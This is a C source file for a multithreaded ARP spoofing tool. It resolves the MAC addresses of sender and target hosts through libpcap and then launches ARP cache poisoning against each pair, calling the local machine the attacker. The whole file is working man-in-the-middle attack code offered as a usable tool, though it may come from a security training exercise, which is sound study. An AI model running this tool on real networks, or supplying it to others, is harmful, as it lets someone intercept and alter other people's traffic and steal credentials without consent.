#include "kmh_header.h"

void usage()
{
	printf("syntax : arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
	printf("sample : arp_spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

void *th_main(void *arg);

int main(int argc, char* argv[])
{
	if(argc < 4 || argc % 2 != 0 || argc > 2*(MAX_NUM_THREAD + 2))
	{
		usage();
		return -1;
	}

	struct thread_arg th_arg[MAX_NUM_THREAD];
	pthread_t threads[MAX_NUM_THREAD];
	int i, status;

	for(i=0 ; i<(argc-2)/2 ; i++)
	{
		th_arg[i].index = i;
		th_arg[i].dev = argv[1];
		th_arg[i].SenderIP = argv[2*i+2];
		th_arg[i].TargetIP = argv[2*i+3];

		if(pthread_create(&threads[i], NULL, &th_main, (void *)&th_arg[i]) != 0)
		{
			fprintf(stderr, "couldn't create thread %d\n", i);
			return -1;
		}
		printf("Thread %d successfully created.\n", i);
	}

	printf("Running...\n");
	printf("Exit : Ctrl + C\n");

	for(i=0; i<(argc-2)/2; i++)
		pthread_join(threads[i], (void **)&status);

	return 0;
}

void *th_main(void* arg)
{
	char *dev;
	char buf[20];
	struct in_addr AttackerIP, SenderIP, TargetIP;
	struct libnet_ether_addr AttackerHA, SenderHA, TargetHA;
	struct thread_arg* th_arg = (struct thread_arg*)arg;

	dev = th_arg->dev;
	inet_pton(AF_INET, th_arg->SenderIP, &SenderIP);
	inet_pton(AF_INET, th_arg->TargetIP, &TargetIP);

	GetLocalIP(&AttackerIP, dev);
	GetLocalHA(&AttackerHA, dev);

	// printf("Local IP : %s\n", inet_ntoa(AttackerIP));
	// printf("Local HA : %s\n", my_ether_ntoa(&AttackerHA, buf));

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if(handle == NULL)
	{
		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
		return (void *)-1;
	}
	
	// get senderHA
	SendARPRequest(handle, &AttackerIP, &SenderIP, &AttackerHA);
	GetTargetHA(handle, &AttackerIP, &SenderIP, &AttackerHA, &SenderHA);
	printf("Thread NO.%d : Sender HA : %s\n", th_arg->index, my_ether_ntoa(&SenderHA, buf));
	
	// get targetHA
	SendARPRequest(handle, &AttackerIP, &TargetIP, &AttackerHA);
	GetTargetHA(handle, &AttackerIP, &TargetIP, &AttackerHA, &TargetHA);
	printf("Thread NO.%d : Target HA : %s\n", th_arg->index, my_ether_ntoa(&TargetHA, buf));

	// arp spoofing
	printf("\nThread NO.%d : start ARP spoofing ...\n", th_arg->index);
	if(ARPSpoof(handle, AttackerIP, SenderIP, TargetIP, AttackerHA, SenderHA, TargetHA) != 0)
	{
		printf("Couldn't start attack.\n");
		return (void *)-1;
	}
	printf("Thread NO.%d : Done!\n", th_arg->index);

	pcap_close(handle);
	
	return (void *)0;
}
